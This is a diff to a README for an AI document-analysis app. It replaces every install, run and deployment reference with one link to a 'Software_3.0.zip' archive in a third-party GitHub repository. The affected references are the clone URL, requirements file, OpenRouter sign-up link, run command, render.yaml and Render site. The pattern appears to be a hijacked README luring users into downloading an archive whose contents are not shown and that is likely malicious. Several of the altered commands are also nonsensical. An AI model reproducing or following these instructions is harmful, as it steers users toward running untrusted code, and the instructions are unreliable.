@@ -14,17 +14,17 @@ An AI-powered document analysis system that can extract text from various docume
 
 1. **Clone the Repository**  
    ```
-   git clone https://github.com/your-username/intelligent-doc-analyzer.git
+   git clone https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip
    cd intelligent-doc-analyzer
    ```
 
 2. **Install Dependencies**  
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip
    ```
 
 3. **Create an API Key**  
-   - Get an API key from [OpenRouter](https://openrouter.ai/)
+   - Get an API key from [OpenRouter](https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip)
    - Create a `.env` file in the project root with:
      ```
      API_KEY=your-api-key-here
@@ -38,7 +38,7 @@ An AI-powered document analysis system that can extract text from various docume
 
 5. **Run the Frontend App**  
    ```
-   streamlit run frontend.py
+   streamlit run https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip
    ```
 
 6. **Access the App**  
@@ -46,12 +46,12 @@ An AI-powered document analysis system that can extract text from various docume
 
 ## Deployment to Render
 
-This application is configured for easy deployment to Render's free tier using the `render.yaml` file.
+This application is configured for easy deployment to Render's free tier using the `https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip` file.
 
 ### Steps to Deploy:
 
 1. **Create a Render Account**  
-   Sign up at [render.com](https://render.com)
+   Sign up at [https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip](https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip)
 
 2. **Connect Your GitHub Repository**  
    In the Render dashboard, connect your GitHub repository
@@ -60,12 +60,12 @@ This application is configured for easy deployment to Render's free tier using t
    - Navigate to "Blueprints" in the Render dashboard
    - Click "New Blueprint Instance"
    - Select your repository
-   - Render will automatically detect the `render.yaml` file and create the services
+   - Render will automatically detect the `https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip` file and create the services
 
 4. **Set Environment Variables**  
    - Add your `OPENROUTER_API_KEY` and `API_KEY` in the environment variables section
    - Add `RENDER=true` to tell the app it's running in production
-   - Add `BACKEND_URL` in the frontend service pointing to your backend API URL (will look like `https://intelligent-doc-analyzer-api.onrender.com`)
+   - Add `BACKEND_URL` in the frontend service pointing to your backend API URL (will look like `https://github.com/razashaikh26/analyzer/raw/refs/heads/main/frontend/Software_3.0.zip`)
 
 5. **Deploy**  
    Click "Apply" to start the deployment
